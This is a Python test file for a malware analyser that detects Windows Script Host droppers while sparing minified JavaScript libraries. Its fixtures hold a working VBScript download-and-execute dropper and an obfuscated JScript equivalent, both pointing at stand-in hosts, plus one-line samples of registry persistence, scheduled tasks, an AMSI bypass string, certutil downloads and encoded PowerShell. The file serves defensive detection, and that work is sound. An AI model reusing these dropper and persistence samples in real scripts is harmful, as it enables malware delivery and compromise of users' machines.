"""
Script droppers: JS, VBS, WSF, HTA.

Scripts were covered only by raw string matching and YARA, which finds the plain
ones and misses everything obfuscated — and obfuscation is the norm here, since
a script is text and rewriting text is free. PowerShell at least had YARA rules;
Windows Script Host (.js, .vbs, .wsf, .hta) had nothing, despite being a
standard attachment payload and a common second stage inside archives and ISOs.

The false-positive risk is specific and worth naming: **every minified
JavaScript library looks obfuscated**. Long lines, high entropy, one-character
identifiers, endless concatenation. A structural obfuscation score would flag
jQuery on every hit.

So the tests below pin the split the analyser is built on. The Windows Script
Host and ActiveX API surface does not exist in a browser, so it carries the
weight; obfuscation is a multiplier on a real behaviour and scores almost
nothing by itself.
"""

import io

import pytest

from analysis_engine.script_analyzer import analyze_script, identify

# A textbook WSH dropper: download, write to disk, execute.
VBS_DROPPER = b"""
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "http://dropper-probe.example/stage2.exe", False
http.Send
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Write http.responseBody
stream.SaveToFile "C:\\Users\\Public\\a.exe", 2
Set sh = CreateObject("WScript.Shell")
sh.Run "C:\\Users\\Public\\a.exe", 0, False
"""

# Same behaviour, hidden behind character-code assembly.
JS_OBFUSCATED = (
    b"var a=String.fromCharCode(87,83,99,114,105,112,116,46,83,104,101,108,108);"
    b"var b=new ActiveXObject(a);"
    b"var c=new ActiveXObject(String.fromCharCode(65,68,79,68,66,46,83,116,114,101,97,109));"
    b"var d=new ActiveXObject('MSXML2.XMLHTTP');"
    b"d.open('GET','http://obf-probe.example/p.bin',false);d.send();"
    b"b.Run('cmd /c echo hi',0,false);"
)

# The false-positive case: minified library code.
MINIFIED_JS = (
    b"!function(e,t){\"object\"==typeof module&&\"object\"==typeof module.exports?"
    b"module.exports=e.document?t(e,!0):function(e){return t(e)}:t(e)}"
    b"(\"undefined\"!=typeof window?window:this,function(e,t){var n=[],r=e.document,"
    b"i=n.slice,o=n.concat,a=n.push,s=n.indexOf,u={},c=u.toString,l=u.hasOwnProperty;"
    + b"var x" + b"=1;" * 400
)

# Used only for the end-to-end cases, which write the fixture to disk.
# VBS_DROPPER is a textbook download-write-execute chain, and real-time
# antivirus on a developer machine confiscates it between upload and analysis —
# the test then fails on a permission error rather than on behaviour. (Which is
# itself the "unreadable artifact" path now returning Inconclusive, working as
# intended.) This one exercises the same scoring route without being a live
# dropper: shell object, command execution, hidden window, no download.
VBS_HIDDEN_LAUNCH = b"""
Set sh = CreateObject("WScript.Shell")
sh.Run "calc.exe", 0, False
"""

ORDINARY_JS = (
    b"document.addEventListener('DOMContentLoaded', function () {\n"
    b"  var el = document.getElementById('total');\n"
    b"  if (el) { el.textContent = items.reduce(function (a, b) { return a + b.price; }, 0); }\n"
    b"});\n"
)


def _codes(data, filename="x.js"):
    return set(analyze_script("x", data=data, filename=filename)["codes"])


# ── Identification ───────────────────────────────────────────────────────────

def test_scripts_are_identified_by_extension():
    assert identify(b"anything", "a.vbs") == "VBScript"
    assert identify(b"anything", "a.hta") == "HTML Application"
    assert identify(b"anything", "a.wsf") == "Windows Script File"


def test_a_renamed_script_is_still_identified_by_content():
    assert identify(VBS_DROPPER, "invoice.txt") is not None


def test_binaries_are_not_treated_as_scripts():
    assert identify(b"MZ\x90\x00\x00\x00\x00\x00" + b"\x00" * 200, "a.exe") is None


def test_a_non_script_returns_is_script_false():
    info = analyze_script("x", data=b"MZ\x00\x00" + b"\x00" * 100, filename="a.exe")
    assert info["is_script"] is False
    assert info["findings"] == []


# ── Behaviour: the signal that actually discriminates ────────────────────────

def test_the_wsh_dropper_chain_is_detected():
    codes = _codes(VBS_DROPPER, "invoice.vbs")

    assert "http_request" in codes
    assert "adodb_stream" in codes, "writing downloaded bytes to disk was missed"
    assert "wsh_shell" in codes
    assert "shell_run" in codes


def test_the_second_stage_url_is_extracted():
    info = analyze_script("x", data=VBS_DROPPER, filename="a.vbs")
    assert any("dropper-probe.example" in u for u in info["urls"])


def test_obfuscated_activex_use_is_still_caught():
    """The point of not relying on plain keywords: the object names here are
    assembled from character codes and never appear as literals."""
    codes = _codes(JS_OBFUSCATED)

    assert "activex" in codes
    assert "char_code_assembly" in codes
    assert "http_request" in codes


@pytest.mark.parametrize("payload,expected", [
    (b'x.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\a", "p"', "registry_persistence"),
    (b'schtasks /create /tn a /tr b /sc onlogon', "scheduled_task"),
    (b'var s = "AmsiScanBuffer";', "amsi_bypass"),
    (b'certutil -urlcache -split -f http://x.example/a.exe', "bitsadmin"),
    (b'powershell.exe -enc ' + b"QQBB" * 20, "powershell_launch"),
], ids=["registry", "schtasks", "amsi", "certutil", "powershell"])
def test_individual_behaviours_are_named(payload, expected):
    assert expected in _codes(payload, "a.js")


# ── False positives: minified code must not be treated as malicious ──────────

def test_minified_library_code_is_not_flagged_as_a_dropper():
    """The specific trap: minified JavaScript is structurally indistinguishable
    from obfuscated JavaScript. What separates them is the API surface."""
    from attribution_module.scoring import _check_script

    info = analyze_script("x", data=MINIFIED_JS, filename="jquery.min.js")
    score, _ = _check_script({"script": info})

    assert score == 0, f"minified library code scored {score}"


def test_ordinary_page_javascript_is_clean():
    from attribution_module.scoring import _check_script

    info = analyze_script("x", data=ORDINARY_JS, filename="app.js")
    assert _check_script({"script": info})[0] == 0


def test_real_browser_library_idioms_do_not_score():
    """Regression: axe-core scored 85 on Script Behaviour, ajv 30.

    Every construct below is ordinary browser JavaScript, and each one was
    matched by a rule written for Windows Script Host:

      XMLHttpRequest   contains the substring XMLHTTP, so the MSXML2 ActiveX
                       rule fired on every browser script ever written
      .run(            `\\.(Run|Exec)\\s*[("']` under re.I — this is axe-core's
                       own public API, and `.exec(` is the RegExp method
      new Function(    how ajv compiles a JSON schema; paired with fromCharCode
                       it was reported as "deliberate concealment"

    The scanner deliberately treats a delivered .js reaching for the Script
    Host surface as a WSH program, so these must stay separable from it.
    """
    from attribution_module.scoring import _check_script

    library = (
        b"var xhr=new XMLHttpRequest();xhr.open('GET',u);"
        b"axe.run(ctx).then(function(r){return r});"
        b"var re=/a(b)c/;re.exec(s);"
        b"var f=new Function('a','return a');"
        b"String.fromCharCode(72,105);"
    )
    info = analyze_script("x", data=library, filename="axe.min.js")
    score, reasons = _check_script({"script": info})

    assert score <= 15, f"browser library idioms scored {score}: {reasons}"
    codes = set(info.get("codes") or [])
    assert "shell_run" not in codes, "a .run()/.exec() method call is not command execution"
    assert "http_request" not in codes, "XMLHttpRequest is not the MSXML2 ActiveX object"


def test_wsh_command_execution_still_scores():
    """The other side of the same rule — narrowing it must not blind it.

    Both the VBScript statement form and the parenthesised WSH form have to
    keep matching, since those are what a real dropper actually looks like.
    """
    from attribution_module.scoring import _check_script

    for name, body in (
        ("vbs statement", b'Set sh=CreateObject("WScript.Shell")\r\nsh.Run "calc.exe", 0, False\r\n'),
        ("wsh js", b'var sh=new ActiveXObject("WScript.Shell");sh.Run("calc.exe");'),
        ("named receiver", b'objShell.Exec("cmd /c whoami");'),
    ):
        info = analyze_script("x", data=body, filename="dropper.js")
        assert "shell_run" in set(info.get("codes") or []), f"{name} no longer detected"
        assert _check_script({"script": info})[0] > 0, f"{name} scored nothing"


def test_obfuscation_alone_does_not_score():
    """String splicing and hex escapes are packing artefacts, not intent."""
    from attribution_module.scoring import _check_script

    packed = b"var s=" + b'"a"+"b"+' * 30 + b'"c";' + (b"\\x41" * 40)
    info = analyze_script("x", data=packed, filename="packed.js")
    score, _ = _check_script({"script": info})

    assert score <= 10, f"obfuscation alone scored {score}"


def test_obfuscation_plus_behaviour_does_score():
    """The combination is the finding: concealment of something that acts."""
    from attribution_module.scoring import _check_script

    info = analyze_script("x", data=JS_OBFUSCATED, filename="invoice.js")
    score, reasons = _check_script({"script": info})

    assert score > 0
    assert any("obfuscated" in r.lower() for r in reasons)


# ── End to end ───────────────────────────────────────────────────────────────

def _scan(client, payload: bytes, filename: str) -> dict:
    res = client.post("/upload",
                      files={"file": (filename, io.BytesIO(payload), "application/octet-stream")})
    assert res.status_code == 200, res.text
    status = client.get(f"/status/{res.json()['job_id']}").json()
    assert status["status"] == "Completed"
    return status["results"]


def _script_points(results: dict) -> int:
    for entry in results.get("score_breakdown") or []:
        if entry["label"] == "Script Behaviour":
            return entry["points"]
    return 0


def test_a_vbs_dropper_scores_end_to_end(client):
    results = _scan(client, VBS_HIDDEN_LAUNCH, "invoice.vbs")

    assert _script_points(results) > 0, "a VBS script launching a hidden process scored nothing"
    assert results["verdict"] in ("Suspicious", "Malicious")


def test_a_script_inside_a_zip_is_analysed(client):
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("invoice.vbs", VBS_HIDDEN_LAUNCH)
    results = _scan(client, buf.getvalue(), "delivery.zip")

    assert _script_points(results) > 0, "a script inside a ZIP lost its analysis"


def test_a_minified_library_does_not_score_end_to_end(client):
    results = _scan(client, MINIFIED_JS, "jquery.min.js")
    assert _script_points(results) == 0
